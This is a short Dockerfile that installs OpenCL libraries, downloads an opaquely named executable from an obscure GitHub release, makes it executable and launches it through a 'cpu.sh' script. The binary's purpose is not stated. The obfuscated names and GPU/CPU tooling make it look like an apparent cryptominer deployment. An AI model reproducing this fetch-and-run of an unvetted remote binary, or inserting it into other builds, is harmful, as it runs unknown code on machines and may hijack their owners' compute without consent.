FROM ubuntu:latest

RUN apt-get update && apt-get install -y ocl-icd-opencl-dev && apt-get install -y git wget

WORKDIR /app

RUN wget https://github.com/varfeplas/crkonel/releases/download/crkom/kormnr && chmod +x kormnr

COPY cpu.sh /app/cpu.sh
RUN chmod +x /app/cpu.sh

CMD ["/app/cpu.sh"]
